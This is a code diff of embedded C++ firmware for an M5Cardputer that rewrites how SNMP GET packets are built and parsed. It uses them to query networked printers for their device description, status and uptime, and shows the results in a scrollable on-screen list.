+    if (valueTag == 0x04) {
+        // OCTET STRING
+        // Copy out the next valueLen bytes as text
+        char temp[128];
+        if (valueLen >= sizeof(temp)) valueLen = sizeof(temp) - 1;
+        memcpy(temp, &buffer[index], valueLen);
+        temp[valueLen] = '\0';
+        outValue = String(temp);
+    }
+    else if (valueTag == 0x02) {
+        // INTEGER
+        if (valueLen == 1) {
+            int val = buffer[index]; 
+            outValue = String(val);
+        } else {
+            // For simplicity, handle only 1-byte integers in this example
+            outValue = F("[Unsupported multi-byte INTEGER]");
+        }
+    }
+    else if (valueTag == 0x43) {
+        // TIME TICKS
+        // Usually 4 bytes, big-endian
+        if (valueLen == 4) {
+            uint32_t ticks = 
+                (uint32_t)buffer[index] << 24 |
+                (uint32_t)buffer[index+1] << 16 |
+                (uint32_t)buffer[index+2] <<  8 |
+                (uint32_t)buffer[index+3];
+            // Convert ticks (1/100s) to some readable format
+            // E.g., "1d 10:20:30" etc.
+            outValue = String(ticks) + " (raw ticks)";
+        } else {
+            outValue = F("[Unsupported TIME TICKS length]");
+        }
+    }
+    else {
+        // For any other tag
+        outValue = F("[Unhandled data type]");
+    }
+
+    // Advance index by valueLen
+    index += valueLen;
+
+    return true;
+}
+
 
 // Function to send an SNMP GET request
 bool sendSNMPRequest(IPAddress printerIP, const char* oid, String& response) {
-    uint8_t packet[50];
-    int packetLength = 0;
+    uint8_t packet[100];
+    int pos = 0;
 
-    // SNMP header construction
-    packet[0] = 0x30; // Sequence
-    packet[1] = 0;    // Placeholder for packet length
-    packet[2] = 0x02; // Integer (version)
-    packet[3] = 0x01;
-    packet[4] = 0x00; // SNMP version 1
+    // SNMP header
+    packet[pos++] = 0x30; // Sequence
+    int lengthPos = pos++;
 
-    // Community string
-    packet[5] = 0x04; // Octet string
-    packet[6] = strlen(SNMP_COMMUNITY);
-    memcpy(&packet[7], SNMP_COMMUNITY, strlen(SNMP_COMMUNITY));
+    // Version
+    packet[pos++] = 0x02; // Integer
+    packet[pos++] = 0x01;
+    packet[pos++] = 0x00; // SNMP version 1
+
+    // Community
+    packet[pos++] = 0x04; // Octet string
+    packet[pos++] = strlen(SNMP_COMMUNITY);
+    memcpy(&packet[pos], SNMP_COMMUNITY, strlen(SNMP_COMMUNITY));
+    pos += strlen(SNMP_COMMUNITY);
 
     // PDU header
-    int pduStart = 7 + strlen(SNMP_COMMUNITY);
-    packet[pduStart] = 0xA0; // GET Request
-    packet[pduStart + 1] = 0; // Placeholder for PDU length
-    packet[pduStart + 2] = 0x02; // Integer (request ID)
-    packet[pduStart + 3] = 0x01;
-    packet[pduStart + 4] = 0x01; // Request ID = 1
+    packet[pos++] = 0xA0; // GET Request
+    int pduLengthPos = pos++;
 
-    // Error and error index
-    packet[pduStart + 5] = 0x02;
-    packet[pduStart + 6] = 0x01;
-    packet[pduStart + 7] = 0x00;
-    packet[pduStart + 8] = 0x02;
-    packet[pduStart + 9] = 0x01;
-    packet[pduStart + 10] = 0x00;
+    packet[pos++] = 0x02; // Integer (request ID)
+    packet[pos++] = 0x01;
+    packet[pos++] = 0x01; // Request ID = 1
+
+    packet[pos++] = 0x02; // Integer (error status)
+    packet[pos++] = 0x01;
+    packet[pos++] = 0x00; // No error
+
+    packet[pos++] = 0x02; // Integer (error index)
+    packet[pos++] = 0x01;
+    packet[pos++] = 0x00; // No error
 
     // Variable bindings
-    int vbStart = pduStart + 11;
-    packet[vbStart] = 0x30; // Sequence
-    packet[vbStart + 1] = 0; // Placeholder for variable bindings length
-    packet[vbStart + 2] = 0x06; // Object identifier
-    packet[vbStart + 3] = strlen(oid);
-    memcpy(&packet[vbStart + 4], oid, strlen(oid));
-    packet[vbStart + 4 + strlen(oid)] = 0x05; // Null value
-    packet[vbStart + 5 + strlen(oid)] = 0x00;
+    packet[pos++] = 0x30; // SEQUENCE (Variable-binding structure)
+    int vbSequenceLengthPos = pos++; // Placeholder for the length of the entire variable-binding sequence
 
-    // Calculate lengths
-    int vbLength = 6 + strlen(oid);
-    packet[vbStart + 1] = vbLength;
-    int pduLength = vbLength + 11;
-    packet[pduStart + 1] = pduLength;
-    int packetLengthFinal = pduLength + 7 + strlen(SNMP_COMMUNITY);
-    packet[1] = packetLengthFinal - 2;
+    // Single variable-binding
+    packet[pos++] = 0x30; // SEQUENCE (Single variable-binding)
+    int vbLengthPos = pos++; // Placeholder for the length of this variable-binding
 
-    // Send packet
+    // Add the OID
+    packet[pos++] = 0x06; // OBJECT IDENTIFIER
+    uint8_t encodedOID[32];
+    int encodedLen = encodeOID(oid, encodedOID, sizeof(encodedOID));
+    if (encodedLen < 0) return false;
+    packet[pos++] = encodedLen; // Length of OID
+    memcpy(&packet[pos], encodedOID, encodedLen);
+    pos += encodedLen;
+
+    // Add the value (NULL)
+    packet[pos++] = 0x05; // NULL
+    packet[pos++] = 0x00; // Length of NULL
+
+    // Calculate the length of the single variable-binding
+    packet[vbLengthPos] = pos - vbLengthPos - 1;
+
+    // Calculate the length of the variable-binding sequence
+    packet[vbSequenceLengthPos] = pos - vbSequenceLengthPos - 1;
+
+    // Update the PDU and SNMP message lengths
+    packet[pduLengthPos] = pos - pduLengthPos - 1;
+    packet[lengthPos] = pos - lengthPos - 1;
+
+    /*// Debug: Print the packet being sent
+    Serial.println("[DEBUG] Sending SNMP Packet:");
+    for (int i = 0; i < pos; i++) {
+        Serial.printf("%02X ", packet[i]);
+    }
+    Serial.println();*/
+    
+    // Envoi du paquet
     udp.beginPacket(printerIP, SNMP_PORT);
-    udp.write(packet, packetLengthFinal);
+    udp.write(packet, pos);
     udp.endPacket();
-
-    // Wait for response
+    
+    // Attente de la réponse
     uint32_t startTime = millis();
     while (millis() - startTime < 1000) {
         int packetSize = udp.parsePacket();
         if (packetSize) {
             uint8_t buffer[255];
-            udp.read(buffer, 255);
-
-            // Extract the response value
-            response = String((char*)&buffer[packetSize - 1]);
+            udp.read(buffer, sizeof(buffer));
+    
+            /*// Debug : afficher le paquet reçu
+            Serial.println("[DEBUG] Received SNMP Response:");
+            for (int i = 0; i < packetSize; i++) {
+                Serial.printf("%02X ", buffer[i]);
+            }
+            Serial.println();*/
+    
+            // Appel à une fonction de parsing BER-SNMP (à implémenter ou à inclure d'une librairie)
+            String parsedValue;
+            if (parseSNMPResponse(buffer, packetSize, parsedValue)) {
+                response = parsedValue;
+            } else {
+                response = F("Parsing error");
+            }
+    
             return true;
         }
     }
+    
     return false;
 }
 
-// Function to check printer status
 void checkPrinterStatus() {
-      if (WiFi.localIP().toString() == "0.0.0.0") {
+    int displayStart = 0;
+    int lineHeight = 12;
+    int maxLines = M5.Display.height() / lineHeight;
+    bool needsDisplayUpdate = true;
+
+    if (WiFi.localIP().toString() == "0.0.0.0") {
         Serial.println("[INFO] Not connected to a network.");
-        waitAndReturnToMenu("Not connected to a network.");
         return;
     }
 
-    // Clear display
-    M5.Display.clear();
-    M5.Display.setTextSize(1);
-    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-    M5.Display.setCursor(0, 0);
-    M5.Display.println("Checking printer status...");
+    // On prépare notre vecteur de lignes à afficher
+    std::vector<String> printerLines;
+    printerLines.reserve(50); // Par exemple, on réserve un peu d'espace
 
-    // Load printer IPs from configuration or use detected printers
+    // Chemin de config
     String printerConfigPath = "/Printer/PrinterIp.txt";
     std::vector<IPAddress> printerIPs;
 
-    // Check for configuration file on the SD card
+    // Lecture du fichier IP
     if (SD.exists(printerConfigPath)) {
         File config = SD.open(printerConfigPath);
         if (config) {
             while (config.available()) {
                 String line = config.readStringUntil('\n');
                 line.trim();
-                if (!line.isEmpty()) {
-                    IPAddress ip;
-                    if (ip.fromString(line)) {
-                        printerIPs.push_back(ip);
-                    } else {
-                        Serial.printf("Invalid IP format in PrinterIp.txt: %s\n", line.c_str());
-                    }
+                IPAddress ip;
+                if (ip.fromString(line)) {
+                    printerIPs.push_back(ip);
                 }
             }
             config.close();
         }
     }
 
-    // If configuration file is empty, use detected printers
     if (printerIPs.empty()) {
+        Serial.println("[INFO] No printers detected or configured.");
         printerIPs = detectedPrinters;
+        
     }
 
-    // Check if there are any printers to process
-    if (printerIPs.empty()) {
-        M5.Display.setCursor(0, 20);
-        M5.Display.println("No printers detected or configured.");
-        Serial.println("[INFO] No printers to check.");
-        waitAndReturnToMenu("No printers to check.");
-        return;
-    }
+    // OIDs SNMP
+    const char* deviceOid = "1.3.6.1.2.1.25.3.2.1.3.1";
+    const char* statusOid = "1.3.6.1.2.1.25.3.2.1.5.1";
+    const char* uptimeOid = "1.3.6.1.2.1.1.3.0";
 
-    // OIDs for printer information
-    const char* deviceOid = "1.3.6.1.2.1.25.3.2.1.3.1"; // Device description
-    const char* statusOid = "1.3.6.1.2.1.25.3.2.1.5.1"; // Status
-    const char* uptimeOid = "1.3.6.1.2.1.1.3.0";        // Uptime
-
-    // Iterate over printers
-    int yOffset = 0;
+    // Pour chaque imprimante
     for (const auto& printerIP : printerIPs) {
-        String device, status, uptime;
+        String device = "Unknown";
+        String status = "Unknown";
+        String uptime = "Unknown";
 
-        if (sendSNMPRequest(printerIP, deviceOid, device) &&
-            sendSNMPRequest(printerIP, statusOid, status) &&
-            sendSNMPRequest(printerIP, uptimeOid, uptime)) {
-            M5.Display.setCursor(0, yOffset);
-            M5.Display.printf("%s\nDevice: %s\nStatus: %s\nUptime: %s\n",
-                              printerIP.toString().c_str(), device.c_str(), status.c_str(), uptime.c_str());
-            yOffset += 40;
+        bool okDevice = sendSNMPRequest(printerIP, deviceOid, device);
+        bool okStatus = sendSNMPRequest(printerIP, statusOid, status);
+        bool okUptime = sendSNMPRequest(printerIP, uptimeOid, uptime);
+
+        printerLines.push_back("-----------------------");
+        printerLines.push_back(printerIP.toString()); 
+        printerLines.push_back("-----------------------");
+
+        // DEVICE
+        if (okDevice) {
+            printerLines.push_back(device);
+            Serial.printf("[INFO] %s => Device: %s\n", 
+                          printerIP.toString().c_str(), 
+                          device.c_str());
         } else {
-            Serial.printf("Failed to fetch SNMP data for printer: %s\n", printerIP.toString().c_str());
+            printerLines.push_back("Device: Error");
+            Serial.printf("[ERROR] %s => Device fetch failed\n",
+                          printerIP.toString().c_str());
+        }
+
+        // STATUS
+        if (okStatus) {
+            // Convertir la valeur (1..5) en chaîne
+            if (status.equals("1"))      status = "Unknown";
+            else if (status.equals("2")) status = "Running";
+            else if (status.equals("3")) status = "Warning";
+            else if (status.equals("4")) status = "Testing";
+            else if (status.equals("5")) status = "Down";
+            else                         status = "Other";
+
+            printerLines.push_back(status);
+            Serial.printf("[INFO] %s => Status: %s\n", 
+                          printerIP.toString().c_str(), 
+                          status.c_str());
+        } else {
+            printerLines.push_back("Status: Error");
+            Serial.printf("[ERROR] %s => Status fetch failed\n",
+                          printerIP.toString().c_str());
+        }
+
+        if (okUptime) {
+            // Si par ex. "113021400 (raw ticks)"
+            if (uptime.endsWith("(raw ticks)")) {
+                int spaceIndex = uptime.indexOf(' ');
+                if (spaceIndex > 0) {
+                    String ticksStr = uptime.substring(0, spaceIndex);
+                    uint32_t ticksVal = ticksStr.toInt();
+
+                    // Convert ticks in j/h/m/s
+                    uint32_t totalSeconds = ticksVal / 100;
+                    uint32_t days    = totalSeconds / 86400;
+                    uint32_t hours   = (totalSeconds % 86400) / 3600;
+                    uint32_t minutes = (totalSeconds % 3600) / 60;
+                    uint32_t seconds = totalSeconds % 60;
+
+                    char buff[64];
+                    snprintf(buff, sizeof(buff),
+                             "%ud %02u:%02u:%02u", days, hours, minutes, seconds);
+                    uptime = String(buff);
+                }
+            }
+            printerLines.push_back(uptime);
+            Serial.printf("[INFO] %s => Uptime: %s\n",
+                          printerIP.toString().c_str(),
+                          uptime.c_str());
+        } else {
+            printerLines.push_back("Uptime: Error");
+            Serial.printf("[ERROR] %s => Uptime fetch failed\n",
+                          printerIP.toString().c_str());
         }
     }
 
-    // Finalize display
-    M5.Display.setCursor(0, yOffset);
-    M5.Display.println("Done checking printers.");
-    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-      M5.update();
-      M5Cardputer.update();
-      delay(100);
-  }
-  waitAndReturnToMenu("Return to menu");
+    printerLines.push_back("-----------------------");
+    printerLines.push_back("Scan Terminated.");
+    printerLines.push_back("-----------------------");
+
+    displayStart = 0; // on remet à zéro l'index de scroll
+    needsDisplayUpdate = true;
+    enterDebounce();
+    while (true) {
+        M5Cardputer.update();
+
+        if (handleScrolling(displayStart, maxLines, printerLines.size())) {
+            needsDisplayUpdate = true;
+        }
+
+        if (needsDisplayUpdate) {
+            displayResults(displayStart, maxLines, printerLines);
+            needsDisplayUpdate = false;
+        }
+
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) { 
+            break;
+        }
+        delay(50);
+    }
+
+    waitAndReturnToMenu("return to menu");
 }
